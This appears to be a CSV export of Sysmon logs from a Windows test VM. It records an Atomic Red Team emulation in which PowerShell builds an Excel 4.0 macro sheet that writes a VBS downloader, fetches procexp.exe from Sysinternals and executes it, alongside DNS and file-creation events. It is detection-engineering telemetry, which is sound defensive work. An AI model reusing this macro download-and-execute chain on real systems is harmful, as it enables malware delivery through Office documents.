ProcessId: 5512

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$fname = \""""$env:TEMP\atomic_redteam_x4m_exec.vbs\""""
$fname1 = \""""$env:TEMP\procexp.exe\""""
if (Test-Path $fname) {
  Remove-Item $fname
  Remove-Item $fname1
}

$xlApp = New-Object -COMObject \""""Excel.Application\""""
$xlApp.Visible = $True
$xlApp.DisplayAlerts = $False
$xlBook = $xlApp.Workbooks.Add()
$sheet = $xlBook.Excel4MacroSheets.Add()

if (\""""$env:Username\"""" -ne \""""\"""") {
  $sheet.Cells.Item(1,1) = \""""$env:Username\""""
} else {
  $sheet.Cells.Item(1,1) = \""""=GET.WORKSPACE(26)\""""
}

$sheet.Cells.Item(2,1) = \""""procexp.exe\""""
$sheet.Cells.Item(3,1) = \""""atomic_redteam_x4m_exec.vbs\""""
$sheet.Cells.Item(4,1) = \""""=IF(ISNUMBER(SEARCH(`\""""64`\"""",GET.WORKSPACE(1))), GOTO(A5),)\""""
$sheet.Cells.Item(5,1) = \""""=FOPEN(`\""""C:\Users\`\""""&A1&`\""""\AppData\Local\Temp\`\""""&A3&`\""""`\"""", 3)\""""
$sheet.Cells.Item(6,1) = \""""=FWRITELN(A5, `\""""url = `\""""`\""""https://live.sysinternals.com/procexp.exe`\""""`\""""`\"""")\""""
$sheet.Cells.Item(7,1) = \""""=FWRITELN(A5, `\""""`\"""")\""""
$sheet.Cells.Item(8,1) = \""""=FWRITELN(A5, `\""""Set winHttp = CreateObject(`\""""`\""""WinHTTP.WinHTTPrequest.5.1`\""""`\"""")`\"""")\""""
$sheet.Cells.Item(9,1) = \""""=FWRITELN(A5, `\""""winHttp.Open `\""""`\""""GET`\""""`\"""", url, False`\"""")\""""
$sheet.Cells.Item(10,1) = \""""=FWRITELN(A5, `\""""winHttp.Send`\"""")\""""
$sheet.Cells.Item(11,1) = \""""=FWRITELN(A5, `\""""If winHttp.Status = 200 Then`\"""")\""""
$sheet.Cells.Item(12,1) = \""""=FWRITELN(A5, `\""""Set oStream = CreateObject(`\""""`\""""ADODB.Stream`\""""`\"""")`\"""")\""""
$sheet.Cells.Item(13,1) = \""""=FWRITELN(A5, `\""""oStream.Open`\"""")\""""
$sheet.Cells.Item(14,1) = \""""=FWRITELN(A5, `\""""oStream.Type = 1`\"""")\""""
$sheet.Cells.Item(15,1) = \""""=FWRITELN(A5, `\""""oStream.Write winHttp.responseBody`\"""")\""""
$sheet.Cells.Item(16,1) = \""""=FWRITELN(A5, `\""""oStream.SaveToFile `\""""`\""""C:\Users\`\""""&A1&`\""""\AppData\Local\Temp\`\""""&A2&`\""""`\""""`\"""", 2`\"""")\""""
$sheet.Cells.Item(17,1) = \""""=FWRITELN(A5, `\""""oStream.Close`\"""")\""""
$sheet.Cells.Item(18,1) = \""""=FWRITELN(A5, `\""""End If`\"""")\""""
$sheet.Cells.Item(19,1) = \""""=FCLOSE(A5)\""""
$sheet.Cells.Item(20,1) = \""""=EXEC(`\""""explorer.exe C:\Users\`\""""&A1&`\""""\AppData\Local\Temp\`\""""&A3&`\""""`\"""")\""""
$sheet.Cells.Item(21,1) = \""""=WAIT(NOW()+`\""""00:00:05`\"""")\""""
$sheet.Cells.Item(22,1) = \""""=EXEC(`\""""explorer.exe C:\Users\`\""""&A1&`\""""\AppData\Local\Temp\`\""""&A2&`\""""`\"""")\""""
$sheet.Cells.Item(23,1) = \""""=HALT()\""""
$sheet.Cells.Item(1,1).Name = \""""runme\""""
$xlApp.Run(\""""runme\"""")
$xlApp.Quit()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Remove-Variable xlBook
Remove-Variable xlApp}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a3f4-658c-d001-000000000f00},3588,5512,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:23:48.0960425Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:48.094,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:48.0960425Z""/>
      <EventRecordID>19589</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:48.094</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3f4-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">5512</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$fname = \""""$env:TEMP\atomic_redteam_x4m_exec.vbs\""""
$fname1 = \""""$env:TEMP\procexp.exe\""""
if (Test-Path $fname) {
  Remove-Item $fname
  Remove-Item $fname1
}

$xlApp = New-Object -COMObject \""""Excel.Application\""""
$xlApp.Visible = $True
$xlApp.DisplayAlerts = $False
$xlBook = $xlApp.Workbooks.Add()
$sheet = $xlBook.Excel4MacroSheets.Add()

if (\""""$env:Username\"""" -ne \""""\"""") {
  $sheet.Cells.Item(1,1) = \""""$env:Username\""""
} else {
  $sheet.Cells.Item(1,1) = \""""=GET.WORKSPACE(26)\""""
}

$sheet.Cells.Item(2,1) = \""""procexp.exe\""""
$sheet.Cells.Item(3,1) = \""""atomic_redteam_x4m_exec.vbs\""""
$sheet.Cells.Item(4,1) = \""""=IF(ISNUMBER(SEARCH(`\""""64`\"""",GET.WORKSPACE(1))), GOTO(A5),)\""""
$sheet.Cells.Item(5,1) = \""""=FOPEN(`\""""C:\Users\`\""""&amp;A1&amp;`\""""\AppData\Local\Temp\`\""""&amp;A3&amp;`\""""`\"""", 3)\""""
$sheet.Cells.Item(6,1) = \""""=FWRITELN(A5, `\""""url = `\""""`\""""https://live.sysinternals.com/procexp.exe`\""""`\""""`\"""")\""""
$sheet.Cells.Item(7,1) = \""""=FWRITELN(A5, `\""""`\"""")\""""
$sheet.Cells.Item(8,1) = \""""=FWRITELN(A5, `\""""Set winHttp = CreateObject(`\""""`\""""WinHTTP.WinHTTPrequest.5.1`\""""`\"""")`\"""")\""""
$sheet.Cells.Item(9,1) = \""""=FWRITELN(A5, `\""""winHttp.Open `\""""`\""""GET`\""""`\"""", url, False`\"""")\""""
$sheet.Cells.Item(10,1) = \""""=FWRITELN(A5, `\""""winHttp.Send`\"""")\""""
$sheet.Cells.Item(11,1) = \""""=FWRITELN(A5, `\""""If winHttp.Status = 200 Then`\"""")\""""
$sheet.Cells.Item(12,1) = \""""=FWRITELN(A5, `\""""Set oStream = CreateObject(`\""""`\""""ADODB.Stream`\""""`\"""")`\"""")\""""
$sheet.Cells.Item(13,1) = \""""=FWRITELN(A5, `\""""oStream.Open`\"""")\""""
$sheet.Cells.Item(14,1) = \""""=FWRITELN(A5, `\""""oStream.Type = 1`\"""")\""""
$sheet.Cells.Item(15,1) = \""""=FWRITELN(A5, `\""""oStream.Write winHttp.responseBody`\"""")\""""
$sheet.Cells.Item(16,1) = \""""=FWRITELN(A5, `\""""oStream.SaveToFile `\""""`\""""C:\Users\`\""""&amp;A1&amp;`\""""\AppData\Local\Temp\`\""""&amp;A2&amp;`\""""`\""""`\"""", 2`\"""")\""""
$sheet.Cells.Item(17,1) = \""""=FWRITELN(A5, `\""""oStream.Close`\"""")\""""
$sheet.Cells.Item(18,1) = \""""=FWRITELN(A5, `\""""End If`\"""")\""""
$sheet.Cells.Item(19,1) = \""""=FCLOSE(A5)\""""
$sheet.Cells.Item(20,1) = \""""=EXEC(`\""""explorer.exe C:\Users\`\""""&amp;A1&amp;`\""""\AppData\Local\Temp\`\""""&amp;A3&amp;`\""""`\"""")\""""
$sheet.Cells.Item(21,1) = \""""=WAIT(NOW()+`\""""00:00:05`\"""")\""""
$sheet.Cells.Item(22,1) = \""""=EXEC(`\""""explorer.exe C:\Users\`\""""&amp;A1&amp;`\""""\AppData\Local\Temp\`\""""&amp;A2&amp;`\""""`\"""")\""""
$sheet.Cells.Item(23,1) = \""""=HALT()\""""
$sheet.Cells.Item(1,1).Name = \""""runme\""""
$xlApp.Run(\""""runme\"""")
$xlApp.Quit()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Remove-Variable xlBook
Remove-Variable xlApp}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:48.094

ProcessGuid: {f57bd86a-a3f4-658c-d001-000000000f00}

ProcessId: 5512

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$fname = \""""$env:TEMP\atomic_redteam_x4m_exec.vbs\""""
$fname1 = \""""$env:TEMP\procexp.exe\""""
if (Test-Path $fname) {
  Remove-Item $fname
  Remove-Item $fname1
}

$xlApp = New-Object -COMObject \""""Excel.Application\""""
$xlApp.Visible = $True
$xlApp.DisplayAlerts = $False
$xlBook = $xlApp.Workbooks.Add()
$sheet = $xlBook.Excel4MacroSheets.Add()

if (\""""$env:Username\"""" -ne \""""\"""") {
  $sheet.Cells.Item(1,1) = \""""$env:Username\""""
} else {
  $sheet.Cells.Item(1,1) = \""""=GET.WORKSPACE(26)\""""
}

$sheet.Cells.Item(2,1) = \""""procexp.exe\""""
$sheet.Cells.Item(3,1) = \""""atomic_redteam_x4m_exec.vbs\""""
$sheet.Cells.Item(4,1) = \""""=IF(ISNUMBER(SEARCH(`\""""64`\"""",GET.WORKSPACE(1))), GOTO(A5),)\""""
$sheet.Cells.Item(5,1) = \""""=FOPEN(`\""""C:\Users\`\""""&amp;A1&amp;`\""""\AppData\Local\Temp\`\""""&amp;A3&amp;`\""""`\"""", 3)\""""
$sheet.Cells.Item(6,1) = \""""=FWRITELN(A5, `\""""url = `\""""`\""""https://live.sysinternals.com/procexp.exe`\""""`\""""`\"""")\""""
$sheet.Cells.Item(7,1) = \""""=FWRITELN(A5, `\""""`\"""")\""""
$sheet.Cells.Item(8,1) = \""""=FWRITELN(A5, `\""""Set winHttp = CreateObject(`\""""`\""""WinHTTP.WinHTTPrequest.5.1`\""""`\"""")`\"""")\""""
$sheet.Cells.Item(9,1) = \""""=FWRITELN(A5, `\""""winHttp.Open `\""""`\""""GET`\""""`\"""", url, False`\"""")\""""
$sheet.Cells.Item(10,1) = \""""=FWRITELN(A5, `\""""winHttp.Send`\"""")\""""
$sheet.Cells.Item(11,1) = \""""=FWRITELN(A5, `\""""If winHttp.Status = 200 Then`\"""")\""""
$sheet.Cells.Item(12,1) = \""""=FWRITELN(A5, `\""""Set oStream = CreateObject(`\""""`\""""ADODB.Stream`\""""`\"""")`\"""")\""""
$sheet.Cells.Item(13,1) = \""""=FWRITELN(A5, `\""""oStream.Open`\"""")\""""
$sheet.Cells.Item(14,1) = \""""=FWRITELN(A5, `\""""oStream.Type = 1`\"""")\""""
$sheet.Cells.Item(15,1) = \""""=FWRITELN(A5, `\""""oStream.Write winHttp.responseBody`\"""")\""""
$sheet.Cells.Item(16,1) = \""""=FWRITELN(A5, `\""""oStream.SaveToFile `\""""`\""""C:\Users\`\""""&amp;A1&amp;`\""""\AppData\Local\Temp\`\""""&amp;A2&amp;`\""""`\""""`\"""", 2`\"""")\""""
$sheet.Cells.Item(17,1) = \""""=FWRITELN(A5, `\""""oStream.Close`\"""")\""""
$sheet.Cells.Item(18,1) = \""""=FWRITELN(A5, `\""""End If`\"""")\""""
$sheet.Cells.Item(19,1) = \""""=FCLOSE(A5)\""""
$sheet.Cells.Item(20,1) = \""""=EXEC(`\""""explorer.exe C:\Users\`\""""&amp;A1&amp;`\""""\AppData\Local\Temp\`\""""&amp;A3&amp;`\""""`\"""")\""""
$sheet.Cells.Item(21,1) = \""""=WAIT(NOW()+`\""""00:00:05`\"""")\""""
$sheet.Cells.Item(22,1) = \""""=EXEC(`\""""explorer.exe C:\Users\`\""""&amp;A1&amp;`\""""\AppData\Local\Temp\`\""""&amp;A2&amp;`\""""`\"""")\""""
$sheet.Cells.Item(23,1) = \""""=HALT()\""""
$sheet.Cells.Item(1,1).Name = \""""runme\""""
$xlApp.Run(\""""runme\"""")
$xlApp.Quit()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Remove-Variable xlBook
Remove-Variable xlApp}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19588,,,<unknown process>,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:24.863

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 2020

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,{00000000-0000-0000-0000-000000000000},3588,2020,,,raw.githubusercontent.com,::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;,0,"
      ",-,,,,,,2023-12-27T22:23:46.8980695Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:24.863,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:46.8980695Z""/>
      <EventRecordID>19588</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:24.863</Data>
      <Data Name=""ProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ProcessId"">2020</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:24.863

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 2020

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:23:46.050,,,,,,,,11,19587,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:23:46.050

ProcessGuid: {f57bd86a-a3f1-658c-ce01-000000000f00}

ProcessId: 10524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_iyvdf3lk.g34.ps1

CreationUtcTime: 2023-12-27 22:23:46.050

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3f1-658c-ce01-000000000f00},3588,10524,,,,,,"
      ",-,,,,,,2023-12-27T22:23:46.0575542Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_iyvdf3lk.g34.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:46.050,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:46.0575542Z""/>
      <EventRecordID>19587</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:46.050</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3f1-658c-ce01-000000000f00}</Data>
      <Data Name=""ProcessId"">10524</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_iyvdf3lk.g34.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:23:46.050</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:23:46.050

ProcessGuid: {f57bd86a-a3f1-658c-ce01-000000000f00}

ProcessId: 10524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_iyvdf3lk.g34.ps1

CreationUtcTime: 2023-12-27 22:23:46.050

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
